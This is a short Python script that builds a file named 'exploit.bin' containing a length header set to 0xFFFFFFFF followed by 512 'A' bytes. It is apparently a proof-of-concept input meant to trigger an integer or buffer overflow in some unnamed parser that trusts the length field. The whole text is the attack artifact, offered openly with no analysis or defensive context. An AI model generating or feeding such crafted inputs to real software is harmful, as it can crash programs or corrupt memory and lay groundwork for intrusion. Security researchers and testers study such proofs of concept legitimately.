import struct

# 4,294,967,295 (0xFFFFFFFF)
vulnerable_len = 0xFFFFFFFF

payload = b"A" * 512 

with open("exploit.bin", "wb") as f:
    f.write(struct.pack("<I", vulnerable_len))
    # Write the payload
    f.write(payload)

print("[+] exploit.bin created with len = 4294967295")